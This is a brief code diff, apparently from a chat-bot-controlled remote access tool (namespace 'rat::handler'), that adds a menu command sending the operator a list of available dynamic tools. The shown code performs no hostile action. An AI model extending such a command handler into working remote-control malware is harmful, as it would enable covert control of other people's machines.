@@ -51,4 +51,7 @@ void Handler::handleHelpCommand() {
     //this->bot.sendMessage(ENCRYPTED_HELP_MESSAGE.data());
 }
 
+void Handler::handleMenuCommand() {
+    this->bot.sendMessage(this->state.listDynamicTools());
+}
 } // namespace rat::handler
